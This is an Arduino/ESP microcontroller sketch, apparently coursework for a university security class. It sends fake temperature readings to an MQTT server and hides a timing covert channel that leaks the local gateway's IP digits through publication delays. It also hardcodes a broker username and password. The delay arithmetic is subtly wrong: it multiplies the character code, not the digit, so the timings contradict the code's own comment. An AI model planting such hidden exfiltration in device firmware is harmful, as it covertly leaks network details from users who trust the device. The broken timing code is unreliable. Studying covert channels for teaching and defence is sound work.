
#include <WiFi.h>
#include <sstream>
#include <iomanip>
#include <PubSubClient.h> // MQTT Client
#include <optional>

struct CovertChannel {
    String  data;
    int     current_char_index;

    CovertChannel(String data) : data(data) {
        current_char_index = 0;
    }

    std::optional<char> next_digit() {
        while (current_char_index < data.length()) {
            char c = data.charAt(current_char_index);
            current_char_index += 1;
            if (isdigit(c)) {
                return { c };
            }
        }
        return {};
    }

    void reset() {
        current_char_index = 0;
    }
};

const char*  ssid         = "<<HOTSPOT SSID>>";
const char*  password     = "<<HOTSPOT PASSWORD>>";

const char*  mqtt_server  = "syssec.eemcs.utwente.nl";
const int    mqtt_port    = 1883;
const char*  mqtt_user    = "wemos11";
const char*  mqtt_pass    = "dfX1a0KUkE";

long         current_temp = 2000;
const int    min_temp     = 1000;
const int    max_temp     = 4000;

WiFiClient   wifi_client;
PubSubClient pubsub_client(wifi_client);
CovertChannel covert_channel {
    String()
};

void setup() {
    randomSeed(analogRead(0));

    Serial.begin(115200);
    WiFi.begin(ssid, password);

    while (WiFi.status() != WL_CONNECTED) {
        delay(500);
        Serial.println("Connecting to WiFi..");
    }

    pubsub_client.setServer(mqtt_server, mqtt_port);

    covert_channel = CovertChannel {
        WiFi.gatewayIP().toString()
    };
}

std::string float_to_string(float value) {
    std::ostringstream stream;
    stream << std::fixed << std::setprecision(2) << value;
    return stream.str();
}

void reconnect() {
    // Loop until we're reconnected
    while (!pubsub_client.connected()) {
        Serial.print("Attempting MQTT connection...");

        // Attempt to connect
        if (pubsub_client.connect("", mqtt_user, mqtt_pass)) {
            Serial.println("connected");
        } else {
            Serial.print("failed, rc=");
            Serial.print(pubsub_client.state());
            Serial.println(" try again in 5 seconds");
            delay(5000);
        }
    }
}

float get_next_temperature_reading() {
    // Fake the sensor data by randomly fluctuate the temperature.
    current_temp += random(-10, 10);

    // Ensure fake temperature is within reasonable bounds.
    if (current_temp < min_temp)
        current_temp = min_temp;
    else if (current_temp > max_temp)
        current_temp = max_temp;

    return (float) current_temp / 100.0f;
}

void publish_temperature_data(float value) {
    // Construct topic string.
    std::string username(mqtt_user, 7);
    std::string topic = "temperature/" + username + "/sensor";

    // Convert temperature to a string message.
    std::string msg = float_to_string(value);

    Serial.print("Publishing temperature data [");
    Serial.print(topic.c_str());
    Serial.print("] ");
    Serial.println(msg.c_str());

    // Publish!
    pubsub_client.publish(topic.c_str(), msg.c_str(), msg.length());
}

void loop() {
    // Reconnect if we lost connection.
    if (!pubsub_client.connected()) {
        reconnect();
    }

    // Read some data and publish it.
    float temperature = get_next_temperature_reading();
    publish_temperature_data(temperature);

    // Update internal loops in mqtt client.
    pubsub_client.loop();

    // Delay for different amount of time depending on covert data
    if (std::optional<char> covert_byte = covert_channel.next_digit()) {
        delay(int(*covert_byte * 100)); // 0 -> 0ms, 1 -> 100ms, 2 -> 200ms, ..., 9 -> 900ms
    } else {
        delay(1000); // if the message is over, wait for 1s
        covert_channel.reset();
    }
}
